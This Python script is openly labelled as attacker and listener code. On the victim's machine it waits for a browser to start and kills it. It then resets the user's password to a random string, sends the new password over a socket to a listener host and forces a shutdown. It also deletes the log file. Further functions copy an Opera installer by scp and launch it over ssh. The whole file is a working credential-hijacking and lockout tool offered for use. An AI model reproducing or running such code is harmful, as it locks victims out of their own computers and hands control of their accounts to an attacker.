import subprocess
import sys
import os
import time
import getpass
import socket
import string
import random
import platform
import requests
import re
from bs4 import BeautifulSoup

# --- CONFIGURATION ---
TARGET_IP_ADDRESS = ""
TARGET_PORT = 12345
LOG_FILE = "new_credentials.txt"
LISTENER_MODE = False
RECEIVED_CREDENTIALS_FILE = "/tmp/received_credentials.txt" if not sys.platform.startswith("win") else "received_credentials.txt"

# --- UTILITY FUNCTIONS ---
def change_user_credentials(new_password="today", target_username=None):
    """
    Changes the password of a specified user.
    Handles different operating systems. Requires appropriate privileges.
    """
    try:
        if sys.platform.startswith("linux"):
            effective_username = target_username if target_username else getpass.getuser()
            if 'SUDO_UID' in os.environ:
                print(f"Running with sudo privileges. Will attempt to change password for user: {effective_username}")
                process = subprocess.Popen(['sudo', 'passwd', effective_username],
                                             stdin=subprocess.PIPE,
                                             stdout=subprocess.PIPE,
                                             stderr=subprocess.PIPE,
                                             text=True)
                process.communicate(input=f"{new_password}\n{new_password}\n")
                result = process.returncode
                if result == 0:
                    print("Password changed successfully.")
                    return 0
                else:
                    print(f"Error: Password change failed. Error Code: {result} Stderr: {process.stderr}", file=sys.stderr)
                    return result
            else:
                print("Error: This script must be run with sudo privileges to change the password without prompting on Linux.", file=sys.stderr)
                return 1
        elif sys.platform.startswith("win"):
            effective_username = target_username if target_username else getpass.getuser()
            print(f"Attempting to change password for user: {effective_username}")
            command = ["net", "user", effective_username, new_password]
            process = subprocess.Popen(command,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
            stdout, stderr = process.communicate()
            result = process.returncode
            if result == 0:
                print("Password changed successfully.")
                return 0
            else:
                print(f"Error: Password change failed. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        elif sys.platform.startswith("darwin"):
            effective_username = target_username if target_username else getpass.getuser()
            print(
                f"Attempting to change password for user: {effective_username} on macOS (requires administrator privileges).")
            command = ["dscl", ".", "-passwd", "/Users/" + effective_username, new_password]
            process = subprocess.Popen(command,
                                         stdin=subprocess.PIPE,
                                         stdout=subprocess.PIPE,
                                         stderr=subprocess.PIPE,
                                         text=True)
            stdout, stderr = process.communicate(input=f"{new_password}\n")
            result = process.returncode
            if result == 0:
                print("Password change attempted successfully (may require subsequent authentication).")
                return 0
            else:
                if "Authentication server refused operation" in stderr:
                    print(f"Error: Password change failed on macOS. Authentication server refused operation. This usually means the operation requires administrator privileges and was not authorized.", file=sys.stderr)
                else:
                    print(f"Error: Password change failed on macOS. Error Code: {result} Stderr: {stderr}", file=sys.stderr)
                return result
        else:
            print("Operating system not supported for password change.", file=sys.stderr)
            return 1
    except FileNotFoundError:
        print("Error: The 'passwd', 'tasklist', 'pgrep', 'net' or 'dscl' command was not found.", file=sys.stderr)
        return 127
    except Exception as e:
        print(f"An unexpected error occurred during password change: {e}", file=sys.stderr)
        return 1


def is_process_running(process_name):
    """Checks if a specific process is running (OS-dependent)."""
    try:
        if sys.platform.startswith('win'):
            process = subprocess.Popen(['tasklist', '/FI', f'IMAGENAME eq {process_name}'],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return process_name.encode() in stdout
        elif sys.platform.startswith('linux'):
            process = subprocess.Popen(['pgrep', process_name],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        elif sys.platform.startswith('darwin'):
            process = subprocess.Popen(['pgrep', process_name],
                                        stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, _ = process.communicate()
            return len(stdout) > 0
        else:
            print(f"Warning: OS not fully supported for checking process: {process_name}")
            return False
    except Exception as e:
        print(f"Error checking for process {process_name}: {e}")
        return False

def is_any_browser_installed():
    """Checks if any common web browser is installed by scanning common paths."""
    browser_app_names_darwin = ["Opera.app", "Google Chrome.app", "Firefox.app", "Safari.app"]
    browser_executables_linux = ["opera", "chromium", "firefox", "google-chrome"]
    browser_executables_windows = ["opera.exe", "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe"]
    system = platform.system()

    if system == "Darwin":
        for app_name in browser_app_names_darwin:
            app_path = os.path.join("/Applications", app_name)
            if os.path.exists(app_path):
                print(f"Found potential browser installation: {app_path}")
                return True
        for path in ["/usr/bin", "/usr/local/bin"]:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.lower() in [name.lower().replace(".app", "") for name in browser_app_names_darwin] or file.lower() in browser_executables_linux:
                        print(f"Found potential browser executable: {os.path.join(path, file)}")
                        return True
    elif system == "Linux":
        for path in ["/usr/bin", "/usr/local/bin", "/opt/google/chrome", "/opt/mozilla"]:
            if os.path.exists(path):
                for file in os.listdir(path):
                    if file.lower() in browser_executables_linux:
                        print(f"Found potential browser installation: {os.path.join(path, file)}")
                        return True
    elif system == "Windows":
        for program_files in ["C:\\Program Files", "C:\\Program Files (x86)"]:
            if os.path.exists(program_files):
                for root, _, files in os.walk(program_files):
                    for file in files:
                        if file.lower() in browser_executables_windows:
                            print(f"Found potential browser installation: {os.path.join(root, file)}")
                            return True
        for app_data in [os.path.expanduser("~\\AppData\\Local"), os.path.expanduser("~\\AppData\\Roaming")]:
            if os.path.exists(app_data):
                for root, _, files in os.walk(app_data):
                    for file in files:
                        if file.lower() in browser_executables_windows:
                            print(f"Found potential browser installation: {os.path.join(root, file)}")
                            return True
    return False

def wait_for_browser_running():
    """Waits until any common web browser starts running."""
    browser_processes = ["opera.exe", "chrome.exe", "firefox.exe", "msedge.exe", "iexplore.exe",
                         "opera", "chromium", "firefox", "google-chrome", "Opera.app", "Google Chrome.app",
                         "Firefox.app", "Safari.app"]
    print("Waiting for any browser to start...")
    while True:
        for process in browser_processes:
            # Adjust process name for macOS .app bundles
            process_to_check = process.replace(".app", "") if sys.platform.startswith('darwin') else process
            if is_process_running(process_to_check):
                print(f"Browser detected running: {process}")
                return process
        time.sleep(5)

def kill_browser(browser_process_name):
    """Kills a specific running browser process (OS-dependent)."""
    try:
        print(f"Killing {browser_process_name} processes...")
        if sys.platform.startswith('win'):
            subprocess.run(['taskkill', '/F', '/IM', browser_process_name],
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['killall', '-q', browser_process_name],
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            # Kill by bundle identifier for .app
            if ".app" in browser_process_name:
                bundle_id = browser_process_name.replace(".app", "").lower().replace(" ", "")
                subprocess.run(['killall', '-q', bundle_id],
                               check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            else:
                subprocess.run(['killall', '-q', browser_process_name],
                               check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print(f"Warning: OS not fully supported for killing {browser_process_name}.")
            return
        time.sleep(2)
        print(f"{browser_process_name} processes killed (attempted).")
    except subprocess.CalledProcessError as e:
        print(f"Error killing {browser_process_name}: {e}")


def try_get_opera_download_url():
    download_page_url = "https://www.opera.com/download"
    try:
        response = requests.get(download_page_url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        # Look for a link containing "download", ".opera.com", and ".exe"
        windows_download_link = soup.find('a', href=re.compile(r'https:\/\/download\.opera\.com\/download\/.*\.exe', re.IGNORECASE))
        if windows_download_link and 'href' in windows_download_link.attrs:
            return windows_download_link['href']

        # Look for a link containing "get.geo.opera.com", "win", and ".exe"
        windows_download_link_geo = soup.find('a', href=re.compile(r'https:\/\/get\.geo\.opera\.com\/ftp\/pub\/opera\/desktop\/.*?\/win\/OperaSetup\.exe', re.IGNORECASE))
        if windows_download_link_geo and 'href' in windows_download_link_geo.attrs:
            return windows_download_link_geo['href']

        return None

    except requests.exceptions.RequestException as e:
        print(f"Error fetching download page: {e}")
        return None

def download_and_install_opera():
    """Downloads and installs Opera browser (Windows) using a direct URL."""
    if sys.platform.startswith('win'):
        print("Attempting to download Opera for Windows...")
        opera_download_url = try_get_opera_download_url()
        if not opera_download_url:
            print("Could not automatically determine the Opera download URL.")
            return False
        installer_path = "OperaSetup.exe" # Or the actual filename from the URL
        try:
            response = requests.get(opera_download_url, stream=True)
            response.raise_for_status()
            total_size = int(response.headers.get('content-length', 0))
            bytes_downloaded = 0
            print("Downloading...")
            with open(installer_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
                    bytes_downloaded += len(chunk)
                    if total_size:
                        progress = (bytes_downloaded / total_size) * 100
                        print(f"\rDownloaded {progress:.2f}% ({bytes_downloaded // (1024 * 1024)} MB / {total_size // (1024 * 1024)} MB)", end='')
                    else:
                        print(f"\rDownloaded {bytes_downloaded // (1024 * 1024)} MB", end='')
            print(f"\nOpera installer downloaded to {installer_path}")
            print("Running the installer (silent mode attempted).")
            subprocess.run([installer_path, "/silent"], check=False)
            time.sleep(30)
            if is_opera_installed_full_scan():
                print("Opera installed successfully.")
                if os.path.exists(installer_path):
                    os.remove(installer_path)
                return True
            else:
                print("Opera installation may have failed.")
                if os.path.exists(installer_path):
                    os.remove(installer_path)
                return False
        except requests.exceptions.RequestException as e:
            print(f"Error downloading Opera: {e}")
            if os.path.exists(installer_path):
                os.remove(installer_path)
            return False
        except subprocess.CalledProcessError as e:
            print(f"Error running Opera installer: {e}")
            if os.path.exists(installer_path):
                os.remove(installer_path)
            return False
    else:
        print("Direct download URL method is currently only implemented for Windows.")
        return False

def is_opera_installed_full_scan():
    """
    Performs a full system scan to check if Opera browser is installed.
    This can be time-consuming.

    Returns:
        str or None: The full path to a potential Opera executable or application bundle if found, None otherwise.
    """
    print("Starting full system scan for Opera...")

    if platform.system() == "Windows":
        for root, _, files in os.walk("C:\\"):
            for file in files:
                if file.lower() == "opera.exe":
                    print(f"Found potential Opera executable at: {os.path.join(root, file)}")
                    return os.path.join(root, file)
    elif platform.system() == "Darwin":  # macOS
        for root, _, files in os.walk("/Applications"):
            for file in files:
                if file.lower() == "opera.app":
                    print(f"Found potential Opera application bundle at: {os.path.join(root, file)}")
                    return os.path.join(root, file)
                elif file.lower() == "opera":
                    # Check inside application bundles
                    app_path = os.path.join(root, file)
                    if os.path.isdir(app_path) and "Contents" in os.listdir(app_path) and "MacOS" in os.listdir(
                            os.path.join(app_path, "Contents")):
                        if "opera" in (f.lower() for f in os.listdir(os.path.join(app_path, "Contents", "MacOS"))):
                            print(f"Found potential Opera executable within bundle at: {app_path}")
                            return app_path
        # Check common binary locations
        for path in ["/usr/bin", "/usr/local/bin"]:
            opera_path = os.path.join(path, "opera")
            if os.path.exists(opera_path) and os.access(opera_path, os.X_OK):
                print(f"Found potential Opera executable at: {opera_path}")
                return opera_path
    elif platform.system() == "Linux":
        for root, _, files in os.walk("/"):
            for file in files:
                if file.lower() == "opera":
                    # Basic check for executable name
                    print(f"Found potential Opera executable at: {os.path.join(root, file)}")
                    return os.path.join(root, file)

    print("Full system scan complete.")
    return None


def kill_opera():
    """Kills any running Opera processes (OS-dependent)."""
    try:
        print("Killing Opera processes...")
        if sys.platform.startswith('win'):
            subprocess.run(['taskkill', '/F', '/IM', 'opera.exe'],
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['killall', '-q', 'opera'],
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            subprocess.run(['killall', '-q', 'Opera'],
                           check=False, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print("Warning: OS not fully supported for killing Opera.")
            return
        time.sleep(2)
        print("Opera processes killed (attempted).")
    except subprocess.CalledProcessError as e:
        print(f"Error killing Opera: {e}")



def shutdown_computer():
    """Shuts down the computer (OS-dependent, requires admin/root privileges)."""
    try:
        print("Shutting down the computer...")
        if sys.platform.startswith('win'):
            subprocess.run(['shutdown', '/s', '/f'],
                           check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('linux'):
            subprocess.run(['shutdown', '-h', 'now'],
                           check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        elif sys.platform.startswith('darwin'):
            subprocess.run(['shutdown', '-h', 'now'],
                           check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            print("Warning: OS not fully supported for shutdown.")
            return
        print("Shutdown command executed.")
    except subprocess.CalledProcessError as e:
        print(f"Error shutting down: {e}")


def generate_random_string(length=12):
    """Generates a random string."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for _ in range(length))


def log_credentials(username, password, log_file):
    """Logs the username and password to a text file."""
    try:
        with open(log_file, "w") as f:
            f.write(f"New Username (Attempted): {username}\n")
            f.write(f"New Password: {password}\n")
        print(f"Credentials logged to: {log_file}")
        return True
    except Exception as e:
        print(f"Error logging credentials: {e}")
        return False


def listener_main():
    """Main function for the listening machine."""
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = TARGET_PORT
    received_file_path = RECEIVED_CREDENTIALS_FILE

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.bind((HOST, PORT))
            s.listen()
            print(f"Listening on port {PORT}...")
            conn, addr = s.accept()
            with conn:
                print(f"Connected by {addr}")
                with open(received_file_path, 'wb') as f:
                    while True:
                        data = conn.recv(1024)
                        if not data:
                            break
                        f.write(data)
                print(f"Credentials received and saved to {received_file_path}")
    except KeyboardInterrupt:
        print("\nListener interrupted.")
    except Exception as e:
        print(f"An error occurred in the listener: {e}")
    finally:
        if 's' in locals() and s.fileno() != -1:
            s.close()

def get_current_username():
    """Gets the current username based on the OS."""
    if sys.platform.startswith("win"):
        return os.environ.get("USERNAME")
    elif sys.platform.startswith("linux") or sys.platform.startswith("darwin"):
        return getpass.getuser()
    else:
        return None

def transfer_opera_installer(target_ip, target_username, host_path, target_path):
    """Transfers the Opera installer to the target machine via scp."""
    try:
        remote_source = f"{target_username}@{target_ip}:{host_path.replace('\\', '/')}"
        command = [
            "scp",
            remote_source,
            target_path.replace('\\', '/')
        ]
        print(f"Attempting to transfer installer: {' '.join(command)}")
        process = subprocess.run(command, check=True, capture_output=True, text=True)
        print("Installer transferred successfully.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error transferring installer: {e}")
        print(f"Stderr: {e.stderr}")
        return False
    except FileNotFoundError:
        print("Error: scp command not found. Ensure it's in your system's PATH.")
        return False

def run_remote_installer(target_ip, target_username, installer_path_on_target):
    """Attempts to run the Opera installer remotely via ssh."""
    try:
        command = [
            "ssh",
            f"{target_username}@{target_ip}",
            f"open -a \"{installer_path_on_target}\"" # macOS command to open an application
        ]
        print(f"Attempting to run remote installer: {' '.join(command)}")
        process = subprocess.run(command, check=False, capture_output=True, text=True)
        print("Remote installer execution initiated (check target machine).")
        if process.stderr:
            print(f"Stderr from remote command: {process.stderr}")
        return True
    except FileNotFoundError:
        print("Error: ssh command not found. Ensure it's in your system's PATH.")
        return False
    except Exception as e:
        print(f"An error occurred while running remote installer: {e}")
        return False


def attacker_main():
    """Main function for the attacking machine (now the target machine)."""
    if sys.platform.startswith("linux") and os.geteuid() != 0:
        print("Error: This script requires root privileges (sudo) on Linux to change passwords.")
        return

    if sys.platform.startswith("win"):
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("Error: This script requires administrator privileges on Windows to change passwords.")
            return
    elif sys.platform.startswith("darwin"):
        # Check if the user is an admin (needs more robust checking)
        if os.geteuid() != 0:
            print("Warning: Changing password on macOS might require administrator privileges (run with sudo).")

    print("And it begins :P")

    sending_ip = "192.168.1.155"
    sending_username = "Owner"  # Replace with the actual username on the sending machine
    host_opera_setup_path_on_sender = "C:\\Users\\Owner\\Downloads\\OperaSetup.exe"
    target_username_on_receiver = get_current_username()
    target_temp_path_on_receiver = f"/tmp/OperaSetup.exe" if not sys.platform.startswith("win") else f"C:\\Users\\{target_username_on_receiver}\\AppData\\Local\\Temp\\OperaSetup.exe"

    if is_any_browser_installed():
        print("At least one browser is installed. Waiting for a browser to run...")
        running_browser = wait_for_browser_running()
        if running_browser:
            kill_browser(running_browser)
            new_password = generate_random_string(12)
            current_attacker_username = getpass.getuser() # Log the username on the target machine
            password_changed = change_user_credentials(new_password, current_attacker_username) # Try to change password on the TARGET

            if password_changed == 0:
                print("User credentials changed successfully (or attempted). Proceeding to log and send file.")
                if log_credentials(current_attacker_username, new_password, LOG_FILE): # Log on the target machine
                    target_ip_listener = TARGET_IP_ADDRESS # IP of the listener (could be different)
                    target_port = TARGET_PORT
                    credentials_file = LOG_FILE

                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.connect((target_ip_listener, target_port))
                            with open(credentials_file, 'rb') as f:
                                while True:
                                    data = f.read(1024)
                                    if not data:
                                        break
                                    s.sendall(data)
                            # print(f"Credentials file '{credentials_file}' sent to {target_ip_listener}:{target_port}")
                    except ConnectionRefusedError:
                        print(
                            f"Error: Connection to {target_ip_listener}:{target_port} refused. Ensure the listener is running and the port is open.")
                    except Exception as e:
                        print(f"An error occurred while sending: {e}")
                    finally:
                        shutdown_computer()
                        try:
                            os.remove(credentials_file)  # Remove the file
                            # print(f"Log file '{credentials_file}' removed.")
                        except Exception as e:
                            print(f"Error removing log file: {e}")
                else:
                    print("Failed to log credentials. Shutdown aborted.")
            else:
                print("Failed to change user credentials. Shutdown aborted.")
        else:
            print("No browser was detected running.")
    else:
        print("No common web browser seems to be installed. Skipping browser-related actions.")

# --- MAIN EXECUTION BLOCK ---
if __name__ == "__main__":
    if LISTENER_MODE:
        print(f"Running as listener on {sys.platform}...")
        listener_main()
    else:
        print(f"Running as attacker on {sys.platform}...")
        attacker_main()